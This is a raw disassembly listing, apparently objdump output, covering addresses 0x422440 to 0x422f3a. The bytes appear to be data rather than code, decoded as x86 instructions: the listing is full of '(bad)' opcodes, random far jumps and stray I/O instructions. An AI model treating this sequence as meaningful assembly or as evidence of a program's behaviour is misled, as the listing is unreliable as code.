  422440:	cmp    eax,DWORD PTR [eax]
	...
  4224b2:	add    BYTE PTR [eax],al
  4224b4:	(bad)  
  4224b5:	repnz test BYTE PTR [eax],bl
  4224b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b9:	jle    0x422499
  4224bb:	(bad)  
  4224bc:	(bad)  
  4224bd:	mov    edx,0xb08b9f7c
  4224c2:	inc    ecx
  4224c3:	clc    
  4224c4:	outs   dx,BYTE PTR ds:[si]
  4224c6:	add    DWORD PTR [eax],eax
  4224c8:	cmc    
  4224c9:	add    BYTE PTR [eax],al
  4224cb:	add    BYTE PTR [eax],bl
  4224cd:	test   dh,dh
  4224cf:	sub    DWORD PTR [esi+0x34cddbcc],edx
  4224d5:	popf   
  4224d6:	sar    cl,cl
  4224d8:	dec    edi
  4224d9:	scas   eax,DWORD PTR es:[edi]
  4224da:	jne    0x422540
  4224dc:	inc    eax
  4224dd:	fnstcw WORD PTR [ecx+esi*8-0x49]
  4224e1:	or     BYTE PTR [edx],ch
  4224e3:	push   esp
  4224e4:	jne    0x42248a
  4224e6:	and    BYTE PTR [ebx-0x42868894],cl
  4224ec:	jo     0x4224b0
  4224ee:	fiadd  WORD PTR [ebp-0x528f6ed4]
  4224f4:	push   esp
  4224f5:	and    BYTE PTR [ecx-0x15],ch
  4224f8:	xor    edx,DWORD PTR [edi]
  4224fa:	loop   0x422513
  4224fc:	sub    ebx,ecx
  4224fe:	ret    
  4224ff:	gs cmp eax,0x35c86f8d
  422505:	dec    edi
  422506:	aad    0x26
  422508:	dec    eax
  422509:	repnz outs dx,BYTE PTR ds:[esi]
  42250b:	mov    es,eax
  42250d:	iret   
  42250e:	cmp    eax,ecx
  422510:	cld    
  422511:	xlat   BYTE PTR ds:[ebx]
  422512:	mov    dh,0xbb
  422514:	sub    DWORD PTR [eax-0x117ac41f],esp
  42251a:	xor    al,BYTE PTR [ebx-0x68e1d337]
  422520:	subps  xmm0,XMMWORD PTR ds:0x9fb547b
  422527:	stos   DWORD PTR es:[edi],eax
  422528:	xor    cl,BYTE PTR [esi+0x16]
  42252b:	xchg   edi,eax
  42252c:	jns    0x422569
  42252e:	ficom  DWORD PTR [edx-0x572b5042]
  422534:	pop    ebp
  422535:	xor    al,0xed
  422537:	nop    eax
  42253a:	sub    DWORD PTR [ebx+0x41],0xb36c11d7
  422541:	sar    BYTE PTR [edi-0x36],cl
  422544:	mul    BYTE PTR [edx-0x60eca0b6]
  42254a:	aam    0x5c
  42254c:	mov    bl,0x2c
  42254e:	fmul   QWORD PTR [edx-0x1bb6562f]
  422554:	jbe    0x422546
  422556:	cmp    ch,0x72
  422559:	mov    ch,0x6b
  42255b:	sbb    dh,BYTE PTR [ebp+edx*2+0x23]
  42255f:	sbb    eax,0xe2693022
  422564:	(bad)  
  422565:	xchg   ecx,eax
  422566:	mov    BYTE PTR [ebp+0x61],bl
  422569:	nop
  42256a:	mov    esp,DWORD PTR [esp+ebp*8]
  42256d:	pop    ss
  42256e:	xor    esp,DWORD PTR [ecx-0x1b7aa1]
  422574:	ror    DWORD PTR [edx],1
  422576:	test   al,0x65
  422578:	sub    eax,0x8bede9bb
  42257e:	dec    ebx
  42257f:	mov    bh,0x60
  422581:	dec    esp
  422582:	xchg   DWORD PTR ss:[edi-0x7a],esi
  422586:	leave  
  422587:	mov    dl,0x6a
  422589:	out    0x52,al
  42258b:	aas    
  42258c:	pushf  
  42258d:	jle    0x422587
  42258f:	add    DWORD PTR [edi],0xe873d38
  422595:	xchg   esi,eax
  422596:	sbb    eax,0xe8d67626
  42259b:	pop    ebx
  42259c:	adc    al,0x23
  42259e:	mov    dh,0x1f
  4225a0:	pop    esp
  4225a1:	ds cmp cl,0xee
  4225a5:	xchg   DWORD PTR [ecx+0x54],ebp
  4225a8:	or     dl,ch
  4225aa:	push   cs
  4225ab:	sub    al,0x94
  4225ad:	mov    ds:0x6a8abd8c,eax
  4225b2:	xor    ch,BYTE PTR [ecx-0x41]
  4225b5:	fwait
  4225b6:	out    0xc4,al
  4225b8:	(bad)  
  4225b9:	rcl    cl,1
  4225bb:	fwait
  4225bc:	shl    DWORD PTR [esi+0x76],1
  4225bf:	mov    al,ds:0x1c
	...
  422634:	stos   DWORD PTR es:[edi],eax
  422635:	sub    al,0xed
  422637:	stos   BYTE PTR es:[edi],al
  422638:	out    dx,eax
  422639:	jmp    0x42262a
  42263b:	sub    eax,0xb720f321
  422640:	and    ah,BYTE PTR [edx-0x3b]
  422643:	inc    esi
  422644:	pop    esp
  422645:	outs   dx,DWORD PTR ds:[esi]
  422646:	add    DWORD PTR [eax],eax
  422648:	cmc    
  422649:	add    BYTE PTR [eax],al
  42264b:	add    BYTE PTR [edx+0x56],cl
  42264e:	call   0xa4527c3d
  422653:	push   0x74
  422655:	inc    ebx
  422656:	sahf   
  422657:	mov    ebx,0x54059047
  42265c:	in     eax,dx
  42265d:	retf   0x5b83
  422660:	icebp  
  422661:	sub    esi,DWORD PTR [edx-0xf25b459]
  422667:	nop
  422668:	fistp  QWORD PTR [ecx-0x3]
  42266b:	dec    ebp
  42266c:	aad    0xf5
  42266e:	pop    esp
  42266f:	mov    ds:0xb699567b,eax
  422674:	clc    
  422675:	clc    
  422676:	imul   edi,DWORD PTR [ecx-0x5428ff20],0x44
  42267d:	jno    0x422643
  42267f:	(bad)  
  422680:	xchg   edi,eax
  422681:	rcl    DWORD PTR [edx+0x43],1
  422684:	jno    0x422653
  422686:	je     0x422704
  422688:	mov    ecx,0x8c047afd
  42268d:	or     BYTE PTR [edi-0x12bd7bf5],0xd
  422694:	popf   
  422695:	(bad)  
  422696:	div    dl
  422698:	scas   eax,DWORD PTR es:[edi]
  422699:	mov    al,ds:0x7c1398b1
  42269e:	and    eax,0x56bee0d6
  4226a3:	lahf   
  4226a4:	sahf   
  4226a5:	es lock fs sub al,0x8c
  4226aa:	mov    cl,0x58
  4226ac:	sbb    BYTE PTR [edx+ebx*4-0x4f4255f3],dh
  4226b3:	popa   
  4226b4:	pop    ds
  4226b5:	push   es
  4226b6:	fidivr DWORD PTR [edi+0x52ec9b91]
  4226bc:	add    esi,DWORD PTR [edi]
  4226be:	mov    ebp,0xfd32f341
  4226c3:	outs   dx,DWORD PTR ds:[esi]
  4226c4:	cmp    BYTE PTR [ecx-0x24],ah
  4226c7:	mov    ebp,0x83798ea7
  4226cc:	scas   al,BYTE PTR es:[edi]
  4226cd:	loopne 0x4226d9
  4226cf:	mov    dh,0x89
  4226d1:	xor    eax,0x68754dcf
  4226d6:	icebp  
  4226d7:	repz cmp BYTE PTR [ebp+0x1a1176e1],0xa
  4226df:	in     eax,dx
  4226e0:	in     al,0x9f
  4226e2:	push   eax
  4226e3:	rcr    DWORD PTR [edx],0x3f
  4226e6:	xchg   ecx,eax
  4226e7:	test   eax,0xa3c94194
  4226ec:	(bad)  
  4226ed:	jmp    0x4226aa
  4226ef:	xchg   edi,eax
  4226f0:	pop    ecx
  4226f1:	std    
  4226f2:	cli    
  4226f3:	and    eax,0x8732af65
  4226f8:	out    0x2b,eax
  4226fa:	out    dx,eax
  4226fb:	leave  
  4226fc:	les    eax,FWORD PTR [edi]
  4226fe:	scas   al,BYTE PTR es:[di]
  422700:	and    al,0xa3
  422702:	int    0x42
  422704:	out    dx,al
  422705:	pop    ss
  422706:	cmp    BYTE PTR [edi],ch
  422708:	xchg   esp,eax
  422709:	hlt    
  42270a:	test   DWORD PTR [ecx+0x1e7958cf],edi
  422710:	or     edx,DWORD PTR [eax-0x4f]
  422713:	int3   
  422714:	fnsave [edx]
  422716:	xchg   edx,eax
  422717:	into   
  422718:	cmp    eax,0x3016c649
  42271d:	repnz lods eax,DWORD PTR cs:[esi]
  422720:	pop    ecx
  422721:	and    al,0xb6
  422723:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422724:	bound  ebx,QWORD PTR [esi]
  422726:	(bad)  
  422727:	aam    0xca
  422729:	fild   WORD PTR [ebx+0x6517b0ff]
  42272f:	cmp    al,ch
  422731:	jl     0x42279c
  422733:	inc    edi
  422734:	pop    ss
  422735:	lods   al,BYTE PTR ds:[esi]
  422736:	push   eax
  422737:	mov    ds:0x7c3532ae,al
  42273c:	mov    ch,0x7d
  42273e:	fdivr  st(3),st
  422740:	jg     0x422742
	...
  4227b2:	add    BYTE PTR [eax],al
  4227b4:	shl    DWORD PTR [eax-0x6061f47],1
  4227ba:	fnstenv [ecx-0x69b500ed]
  4227c0:	das    
  4227c1:	jns    0x422776
  4227c3:	inc    ebx
  4227c4:	push   ecx
  4227c5:	jo     0x4227c8
  4227c7:	add    ch,dh
  4227c9:	add    BYTE PTR [eax],al
  4227cb:	add    BYTE PTR [esi],al
  4227cd:	push   ebp
  4227ce:	jo     0x422751
  4227d0:	adc    dh,BYTE PTR ss:[ecx+eiz*1]
  4227d4:	mov    ch,0x23
  4227d6:	ds das 
  4227d8:	mov    dh,0x39
  4227da:	into   
  4227db:	xchg   BYTE PTR [edi],dh
  4227dd:	pop    ebx
  4227de:	jne    0x42276c
  4227e0:	jmp    0x125a:0x4bb3d825
  4227e7:	pop    ds
  4227e8:	adc    dl,al
  4227ea:	mov    eax,0x76d2b8f5
  4227ef:	imul   edi,edx,0x989b8280
  4227f5:	sbb    edi,ecx
  4227f7:	inc    esi
  4227f8:	fild   DWORD PTR [eax+0x47]
  4227fb:	add    eax,0xa33cba31
  422800:	push   ebp
  422801:	jge    0x4227b0
  422803:	out    dx,eax
  422804:	and    al,0xef
  422806:	cdq    
  422807:	repz repz std 
  42280a:	stos   BYTE PTR es:[edi],al
  42280b:	cwde   
  42280c:	adc    bl,0x30
  42280f:	xchg   edx,eax
  422810:	adc    cl,BYTE PTR [ecx-0x49]
  422813:	push   0xffffffb8
  422815:	jns    0x42283d
  422817:	xchg   esi,edi
  422819:	xor    al,0xeb
  42281b:	and    al,bh
  42281d:	aaa    
  42281e:	shl    BYTE PTR [esi-0x10],1
  422821:	test   edi,esi
  422823:	inc    esp
  422824:	mov    ch,0xa4
  422826:	jae    0x422897
  422828:	sbb    al,0xf4
  42282a:	lods   eax,DWORD PTR ds:[esi]
  42282b:	xor    eax,0x89e274c9
  422830:	xchg   ebx,eax
  422831:	mov    dl,0xcb
  422833:	div    BYTE PTR [edx-0x7a]
  422836:	pop    es
  422837:	jnp    0x422848
  422839:	out    dx,eax
  42283a:	imul   esp,DWORD PTR ds:0xa4a91967,0xbb7e0415
  422844:	ss dec ebx
  422846:	push   esi
  422847:	loopne 0x4227e2
  422849:	and    eax,0xd8b6d500
  42284e:	cwde   
  42284f:	jne    0x4227ea
  422851:	stos   BYTE PTR es:[edi],al
  422852:	mov    dh,0x91
  422854:	(bad)  
  422855:	retf   0xf2df
  422858:	inc    esi
  422859:	pushf  
  42285a:	push   cs
  42285b:	xlat   BYTE PTR ds:[ebx]
  42285c:	jne    0x422855
  42285e:	in     al,dx
  42285f:	cmp    al,0x28
  422861:	test   DWORD PTR [eax],esi
  422863:	icebp  
  422864:	pushf  
  422865:	xchg   esp,eax
  422866:	xlat   BYTE PTR ds:[ebx]
  422867:	sbb    al,0xc
  422869:	xchg   ecx,eax
  42286a:	jl     0x4228d6
  42286c:	sti    
  42286d:	stc    
  42286e:	pop    es
  42286f:	mov    ah,0xfb
  422871:	dec    edi
  422872:	mov    eax,ds:0x839eeadd
  422877:	call   0x8d8bb628
  42287c:	push   esp
  42287d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42287e:	jl     0x422851
  422880:	rcr    BYTE PTR [ecx-0x5d],cl
  422883:	adc    al,0x6d
  422885:	adc    al,BYTE PTR [edx+eiz*8-0x742b44bf]
  42288c:	mov    DWORD PTR [eax-0x40],ebp
  42288f:	(bad)  
  422890:	ins    BYTE PTR es:[edi],dx
  422891:	mov    bh,0xaa
  422893:	(bad)  
  422894:	shl    DWORD PTR [ebp+0x2b],cl
  422897:	fwait
  422898:	adc    eax,0xe646d690
  42289d:	stos   DWORD PTR es:[edi],eax
  42289e:	std    
  42289f:	push   cs
  4228a0:	outs   dx,BYTE PTR ds:[esi]
  4228a1:	xchg   ebp,eax
  4228a2:	stos   DWORD PTR es:[edi],eax
  4228a3:	pop    edi
  4228a4:	in     al,dx
  4228a5:	mov    eax,ds:0x79d20f1f
  4228aa:	and    dl,ah
  4228ac:	push   ecx
  4228ad:	xor    DWORD PTR [ebx-0x8947ce3],edi
  4228b3:	jg     0x422873
  4228b5:	push   ds
  4228b6:	xor    DWORD PTR [edx+0x60],esi
  4228b9:	xlat   BYTE PTR ds:[ebx]
  4228ba:	add    al,0x51
  4228bc:	fst    st(6)
  4228be:	into   
  4228bf:	jne    0x4228ec
	...
  422931:	add    BYTE PTR [eax],al
  422933:	add    dh,bh
  422935:	cld    
  422936:	je     0x422955
  422938:	jbe    0x4228d7
  42293a:	(bad)  
  42293b:	jmp    ebx
  42293d:	lea    ecx,[ebx]
  42293f:	xchg   esp,eax
  422940:	adc    BYTE PTR [ecx+0x7146d309],bl
  422946:	add    DWORD PTR [eax],eax
  422948:	cmc    
  422949:	add    BYTE PTR [eax],al
  42294b:	add    BYTE PTR [ebp+0x72a9f010],ah
  422951:	cmp    esp,DWORD PTR [ebp-0x63715da3]
  422957:	mov    dl,0x17
  422959:	jns    0x422951
  42295b:	lods   al,BYTE PTR ds:[esi]
  42295c:	xor    DWORD PTR [ebx+0x1c68fe7b],ebp
  422962:	jmp    0x8568:0xa8cbcdfa
  422969:	pop    esp
  42296a:	les    ebp,FWORD PTR [ecx+0x78]
  42296d:	out    dx,eax
  42296e:	sti    
  42296f:	adc    BYTE PTR [edi],al
  422971:	test   eax,0xa16db716
  422976:	pushf  
  422977:	xor    al,0xc8
  422979:	retf   
  42297a:	cwde   
  42297b:	or     eax,0x86494c31
  422980:	sub    dl,0x9f
  422983:	rol    DWORD PTR [edx-0x4b7be63e],1
  422989:	hlt    
  42298a:	stos   BYTE PTR es:[edi],al
  42298b:	dec    ebx
  42298c:	jne    0x42294e
  42298e:	jno    0x4229bd
  422990:	pop    edx
  422991:	(bad)  
  422992:	mov    dh,0x3c
  422994:	push   edi
  422995:	out    0x82,eax
  422997:	xor    cl,BYTE PTR [ecx]
  422999:	in     eax,0xad
  42299b:	std    
  42299c:	test   edi,ebx
  42299e:	rcl    DWORD PTR [ebp-0x15],cl
  4229a1:	sbb    al,0xae
  4229a3:	pushf  
  4229a4:	jecxz  0x422940
  4229a6:	sbb    al,0x5f
  4229a8:	repz xchg edx,eax
  4229aa:	imul   edx,DWORD PTR [esi],0xffffffbc
  4229ad:	or     ebx,ecx
  4229af:	nop
  4229b0:	dec    ebp
  4229b1:	and    ah,BYTE PTR [eax-0x7b]
  4229b4:	sbb    BYTE PTR [eax+0x671e7119],bl
  4229ba:	mov    ds:0x83a7630b,al
  4229bf:	mov    esi,0x38087d40
  4229c4:	pop    ebx
  4229c5:	mov    bl,0x3b
  4229c7:	dec    edx
  4229c8:	and    ch,ah
  4229ca:	add    ebp,DWORD PTR [ecx-0x33f44ec8]
  4229d0:	loop   0x4229ad
  4229d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229d3:	inc    esp
  4229d4:	cwde   
  4229d5:	stos   DWORD PTR es:[edi],eax
  4229d6:	dec    ebx
  4229d7:	jle    0x42298a
  4229d9:	ret    
  4229da:	dec    eax
  4229db:	adc    ebp,eax
  4229dd:	in     eax,0x86
  4229df:	out    dx,al
  4229e0:	sbb    DWORD PTR [ecx],esp
  4229e2:	ja     0x422a34
  4229e4:	daa    
  4229e5:	push   0x25
  4229e7:	xor    dh,al
  4229e9:	neg    esi
  4229eb:	enter  0x3fc4,0x27
  4229ef:	add    cl,bh
  4229f1:	fadd   DWORD PTR [ebp+0x65]
  4229f4:	and    BYTE PTR [edi+ecx*1+0x5f],ah
  4229f8:	jnp    0x4229ec
  4229fa:	sbb    bh,BYTE PTR gs:[eax]
  4229fd:	ret    0x333e
  422a00:	jl     0x4229dc
  422a02:	mov    bl,0xbc
  422a04:	out    dx,al
  422a05:	xchg   dh,ah
  422a07:	jae    0x422a42
  422a09:	scas   eax,DWORD PTR es:[edi]
  422a0a:	inc    edi
  422a0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a0c:	stc    
  422a0d:	pop    esp
  422a0e:	lods   al,BYTE PTR ds:[esi]
  422a0f:	retf   0xb564
  422a12:	pop    ss
  422a13:	jge    0x4229f3
  422a15:	outs   dx,BYTE PTR ds:[esi]
  422a16:	xchg   esp,eax
  422a17:	pushf  
  422a18:	jmp    0xf478d90e
  422a1d:	pop    ebx
  422a1f:	out    0xbd,al
  422a21:	sbb    eax,0x6ca134b2
  422a26:	addr16 push eax
  422a28:	out    0xea,al
  422a2a:	xchg   esi,eax
  422a2b:	jae    0x422a1b
  422a2d:	(bad)  
  422a2e:	cwde   
  422a2f:	push   esi
  422a30:	pop    ds
  422a31:	adc    cl,BYTE PTR [ebp+0x2f]
  422a34:	mov    eax,ds:0x3ab7e13d
  422a39:	in     eax,dx
  422a3a:	and    al,0x72
  422a3c:	sbb    bh,BYTE PTR [edi+edi*2+0x2e9b]
	...
  422ab3:	add    BYTE PTR [esi],dl
  422ab5:	cdq    
  422ab6:	jmp    0x37401a88
  422abb:	fcmovnbe st,st(0)
  422abd:	cld    
  422abe:	xor    al,0xd0
  422ac0:	ror    BYTE PTR [esi],cl
  422ac2:	add    DWORD PTR [ebx],ebp
  422ac4:	cmp    esi,DWORD PTR [edx+0x1]
  422ac7:	add    ch,dh
  422ac9:	add    BYTE PTR [eax],al
  422acb:	add    BYTE PTR [esi-0x65],cl
  422ace:	and    al,0xa5
  422ad0:	(bad)  
  422ad1:	in     eax,0xa2
  422ad3:	popa   
  422ad4:	inc    eax
  422ad5:	push   ebx
  422ad6:	stos   BYTE PTR es:[edi],al
  422ad7:	imul   ecx,DWORD PTR [eax],0xebe9d826
  422add:	loop   0x422a93
  422adf:	(bad)
  422ae3:	inc    esp
  422ae4:	push   ds
  422ae5:	popa   
  422ae6:	dec    esi
  422ae7:	fisttp WORD PTR [eax-0xd]
  422aea:	lds    eax,FWORD PTR [eax-0x3e32c8d8]
  422af0:	adc    eax,0x62b85ac8
  422af5:	ficom  DWORD PTR [eax-0x27]
  422af8:	adc    eax,0x149225e
  422afd:	mov    edx,0x7707b287
  422b02:	sbb    esp,DWORD PTR [ecx-0x78862f46]
  422b08:	jecxz  0x422b69
  422b0a:	(bad)  
  422b0b:	ins    DWORD PTR es:[edi],dx
  422b0c:	mov    bh,0x64
  422b0e:	fs in  eax,dx
  422b10:	mov    esi,0xf50ec0ae
  422b15:	jbe    0x422aa7
  422b17:	sbb    eax,0x3386cf55
  422b1c:	jbe    0x422ac0
  422b1e:	(bad)  
  422b1f:	stc    
  422b20:	jno    0x422af0
  422b22:	repz push es
  422b24:	aad    0x21
  422b26:	inc    ecx
  422b27:	neg    BYTE PTR [ebx+0x3f]
  422b2a:	sbb    ebx,edi
  422b2c:	inc    esi
  422b2d:	sub    dh,BYTE PTR [edi+0x42]
  422b30:	dec    ebx
  422b31:	bound  edx,QWORD PTR [ebx]
  422b33:	dec    ebp
  422b34:	or     eax,0x8554e257
  422b39:	jg     0x422ad1
  422b3b:	gs ins DWORD PTR es:[edi],dx
  422b3d:	or     DWORD PTR [esi],esi
  422b3f:	sub    eax,0x7b82bd58
  422b44:	sbb    al,cl
  422b46:	sti    
  422b47:	call   0xcb4e855c
  422b4c:	mov    ah,0xc5
  422b4e:	clc    
  422b4f:	and    eax,0xe52217cb
  422b54:	pop    esi
  422b55:	inc    ecx
  422b56:	dec    edi
  422b57:	and    al,0x3f
  422b59:	fmul   QWORD PTR [esi]
  422b5b:	pop    eax
  422b5c:	das    
  422b5d:	add    BYTE PTR [esi+0x49beeac0],ah
  422b63:	cli    
  422b64:	jo     0x422b19
  422b66:	xlat   BYTE PTR ds:[ebx]
  422b67:	outs   dx,BYTE PTR ds:[esi]
  422b68:	dec    ebp
  422b69:	pop    edi
  422b6a:	sub    ch,BYTE PTR [ecx+esi*1]
  422b6d:	or     esi,DWORD PTR [ebx-0x455e94f6]
  422b73:	fcomp  DWORD PTR [edi]
  422b75:	inc    BYTE PTR [ecx+0x36ba0d51]
  422b7b:	xor    edi,DWORD PTR [edi+0x1362e594]
  422b81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b82:	in     eax,dx
  422b83:	sub    al,dl
  422b85:	arpl   WORD PTR [eax],bx
  422b87:	cmp    esp,DWORD PTR [ebx]
  422b89:	ja     0x422be0
  422b8b:	mov    BYTE PTR [edx+eax*8],0x50
  422b8f:	sbb    eax,ebp
  422b91:	pushf  
  422b92:	out    dx,al
  422b93:	adc    dl,bh
  422b95:	mov    bl,0x31
  422b97:	inc    edx
  422b98:	jp     0x422b86
  422b9a:	ret    
  422b9b:	adc    BYTE PTR [esi+0x782cb14f],dh
  422ba1:	frstor ds:0x2c2c17b
  422ba7:	lea    ecx,[ebp+0x41e162a6]
  422bad:	ins    DWORD PTR es:[edi],dx
  422bae:	inc    ebx
  422baf:	inc    edi
  422bb0:	jae    0x422b92
  422bb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422bb3:	sub    BYTE PTR [esi],al
  422bb5:	aas    
  422bb6:	sbb    eax,0xa30c9282
  422bbb:	sub    cl,BYTE PTR [edx+0x15]
  422bbe:	loop   0x422c3b
  422bc0:	xlat   BYTE PTR ds:[ebx]
	...
  422c31:	add    BYTE PTR [eax],al
  422c33:	add    BYTE PTR [eax-0x1a4a95],dh
  422c39:	push   eax
  422c3b:	jg     0x422c9e
  422c3d:	pop    es
  422c3e:	jne    0x422bca
  422c40:	sub    al,0xba
  422c42:	add    edx,DWORD PTR [ecx+0x30]
  422c45:	jae    0x422c48
  422c47:	add    ch,dh
  422c49:	add    BYTE PTR [eax],al
  422c4b:	add    BYTE PTR [ebx],dh
  422c4d:	mov    ch,0x6b
  422c4f:	cld    
  422c50:	sysexit 
  422c52:	inc    ebp
  422c53:	lahf   
  422c54:	outs   dx,BYTE PTR ds:[esi]
  422c55:	cmp    esp,ebx
  422c57:	add    DWORD PTR [ebp-0xd],0xfffffffe
  422c5b:	retf   0x8351
  422c5e:	xor    dl,BYTE PTR [ebx-0x282d2631]
  422c64:	aam    0xf2
  422c66:	int    0x36
  422c68:	in     eax,0x7b
  422c6a:	rcl    DWORD PTR cs:[ebp-0x1796d823],0x18
  422c72:	fs xchg esi,eax
  422c74:	shr    BYTE PTR [ecx],1
  422c76:	cmp    esp,DWORD PTR [ebx]
  422c78:	sub    eax,0xe00ded0a
  422c7d:	push   ecx
  422c7e:	mov    bl,0x4e
  422c80:	mov    esp,0xcb3837a6
  422c85:	inc    ebp
  422c86:	dec    esi
  422c87:	inc    ebp
  422c88:	mov    bh,0x37
  422c8a:	xchg   DWORD PTR [ebp-0x2],ebp
  422c8d:	addr16 xchg esi,eax
  422c8f:	add    al,0x61
  422c91:	imul   dh
  422c93:	or     ah,BYTE PTR [ebp-0x56d411e8]
  422c99:	xor    esp,DWORD PTR [esi]
  422c9b:	repz jmp 0xa538:0x2315a60f
  422ca3:	xchg   ecx,eax
  422ca4:	cmp    edi,DWORD PTR [eax-0x65]
  422ca7:	push   ebp
  422ca8:	mov    bh,0x8a
  422caa:	cmp    bh,BYTE PTR ss:[edi+0xa]
  422cae:	sbb    dh,0x32
  422cb1:	mov    ebx,0x520f6ee3
  422cb6:	div    BYTE PTR [ebx+ebp*8-0x16]
  422cba:	add    esi,DWORD PTR [ecx-0x6a39d080]
  422cc0:	(bad)  
  422cc1:	cmp    DWORD PTR [edi+0xf54ff6e],esp
  422cc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422cc8:	push   esi
  422cc9:	push   esp
  422cca:	push   ebp
  422ccb:	popf   
  422ccc:	test   BYTE PTR [eax],ch
  422cce:	cmp    al,0x75
  422cd0:	ds xchg ebp,eax
  422cd2:	mov    ah,0x41
  422cd4:	sub    esp,eax
  422cd6:	sub    bh,BYTE PTR [eax+0xe76f645]
  422cdc:	inc    esp
  422cdd:	retf   
  422cde:	lods   al,BYTE PTR ds:[esi]
  422cdf:	popf   
  422ce0:	out    0xb3,eax
  422ce2:	sbb    BYTE PTR [esi],ch
  422ce4:	adc    eax,DWORD PTR [ebx]
  422ce6:	sahf   
  422ce7:	sbb    eax,0xd0bc9db6
  422cec:	fnstsw WORD PTR [edi+0x3a]
  422cef:	mov    DWORD PTR [ebx-0x57],edx
  422cf2:	int3   
  422cf3:	inc    ebp
  422cf4:	cdq    
  422cf5:	sbb    dh,BYTE PTR [esi+0x52]
  422cf8:	mov    bl,0xdc
  422cfa:	sub    BYTE PTR [ecx-0x30],bh
  422cfd:	mov    WORD PTR ds:0x9750564a,cs
  422d03:	call   0xd317089d
  422d08:	(bad)  
  422d09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d0a:	sub    al,BYTE PTR [ecx-0x2d]
  422d0d:	std    
  422d0e:	ja     0x422cdd
  422d10:	cwde   
  422d11:	rol    eax,0xe4
  422d14:	(bad)  
  422d16:	add    BYTE PTR [ecx+0x50002302],0xd8
  422d1d:	das    
  422d1e:	pop    eax
  422d1f:	cmp    eax,0xf5f0c8f
  422d24:	lahf   
  422d25:	dec    esi
  422d26:	iret   
  422d27:	mov    BYTE PTR [ebx],al
  422d29:	mov    ecx,0x6f675e08
  422d2e:	push   0x40
  422d30:	clc    
  422d31:	mov    ebp,0x9bd0a5b1
  422d36:	push   ss
  422d37:	addr16 std 
  422d39:	fst    DWORD PTR [edi+0x15]
  422d3c:	les    ecx,FWORD PTR [eax+0x47]
  422d3f:	mov    ebp,edx
	...
  422db1:	add    BYTE PTR [eax],al
  422db3:	add    bh,cl
  422db5:	mov    eax,ds:0xbf7f851b
  422dba:	fucomip st,st(3)
  422dbc:	addr16 mov ecx,0x3d17f9f7
  422dc2:	rol    BYTE PTR [edx+0x17425],1
  422dc8:	cmc    
  422dc9:	add    BYTE PTR [eax],al
  422dcb:	add    BYTE PTR [ebx+ecx*2-0x1a2a70a7],dl
  422dd2:	pop    esi
  422dd3:	aad    0x64
  422dd5:	jecxz  0x422d72
  422dd7:	fcom   DWORD PTR [edx]
  422dd9:	mov    ebp,0xe96953f7
  422dde:	jl     0x422db6
  422de0:	enter  0x98a3,0x3
  422de4:	inc    ebx
  422de5:	(bad)  
  422de6:	pop    ecx
  422de7:	mov    DWORD PTR [ecx+0x10],ebp
  422dea:	jns    0x422d70
  422dec:	add    dh,BYTE PTR [esi-0x51a617f1]
  422df2:	cwde   
  422df3:	inc    esp
  422df4:	loope  0x422e5c
  422df6:	push   cs
  422df7:	add    al,BYTE PTR [esi+ebp*2+0xf]
  422dfb:	dec    ebp
  422dfc:	mov    BYTE PTR [edi-0x222ae500],bl
  422e02:	mov    esi,0x74a888b1
  422e07:	fstp   st(4)
  422e09:	adc    eax,0x8656b4d2
  422e0e:	fwait
  422e0f:	test   al,0x6f
  422e11:	dec    esi
  422e12:	dec    esp
  422e13:	jle    0x422e2a
  422e15:	xchg   ecx,eax
  422e16:	dec    edx
  422e17:	repz sbb al,0x39
  422e1a:	ja     0x422def
  422e1c:	call   0x46a7209f
  422e21:	ficom  DWORD PTR [edi+edi*4+0x747c3eb7]
  422e28:	jae    0x422db3
  422e2a:	push   ecx
  422e2b:	scas   eax,DWORD PTR es:[edi]
  422e2c:	or     BYTE PTR [ecx-0x39133846],bl
  422e32:	mov    ds:0x76647f46,al
  422e37:	jmp    0x9d8e:0xccf089a0
  422e3e:	call   0x3a4:0xf0c965e0
  422e45:	ds int 0xc7
  422e48:	scas   al,BYTE PTR es:[edi]
  422e49:	dec    edx
  422e4a:	push   cs
  422e4b:	cmp    ebp,DWORD PTR ds:0x391306c3
  422e51:	inc    edi
  422e52:	jo     0x422df0
  422e54:	jmp    0xf940:0x8c24f29f
  422e5b:	retf   
  422e5c:	retf   
  422e5d:	dec    ebp
  422e5e:	repnz std 
  422e60:	(bad)  
  422e61:	fbld   TBYTE PTR [esi-0x5c328f13]
  422e67:	sti    
  422e68:	in     eax,dx
  422e69:	or     DWORD PTR [ecx],ecx
  422e6b:	xor    al,0xea
  422e6d:	loope  0x422e87
  422e6f:	jmp    0x5dcb158
  422e74:	aaa    
  422e75:	push   cs
  422e76:	or     al,0xbb
  422e78:	fwait
  422e79:	jns    0x422e21
  422e7b:	push   esi
  422e7c:	test   al,0x96
  422e7e:	mov    ebx,0x65d8c7c4
  422e83:	mov    al,ds:0x5c8d65e9
  422e88:	scas   eax,DWORD PTR es:[edi]
  422e89:	xor    BYTE PTR [eax+0x63],0x7d
  422e8d:	cmp    cl,BYTE PTR [esi]
  422e8f:	stos   DWORD PTR es:[edi],eax
  422e90:	repnz shl edx,1
  422e93:	pop    ss
  422e94:	jmp    0x422f04
  422e96:	(bad)  
  422e97:	xor    dl,BYTE PTR [ebp-0x9f31efb]
  422e9d:	pop    ebp
  422e9e:	jg     0x422e3d
  422ea0:	push   0x4c69cdc3
  422ea5:	xor    eax,0x48ac9c1
  422eaa:	into   
  422eab:	xor    dh,BYTE PTR [edx]
  422ead:	mov    cl,0xe
  422eaf:	add    DWORD PTR ss:[eax],eax
  422eb2:	loope  0x422e89
  422eb4:	sbb    al,0xe
  422eb7:	adc    BYTE PTR [ebx-0x6c1bfe72],dh
  422ebd:	jp     0x422e47
  422ebf:	in     eax,dx
  422ec0:	xchg   esp,eax
	...
  422f31:	add    BYTE PTR [eax],al
  422f33:	add    BYTE PTR [ebx+0x6],ch
  422f36:	(bad)  
  422f37:	dec    edi
  422f38:	out    dx,eax
  422f39:	iret   
  422f3a:	jmp    0x422f62
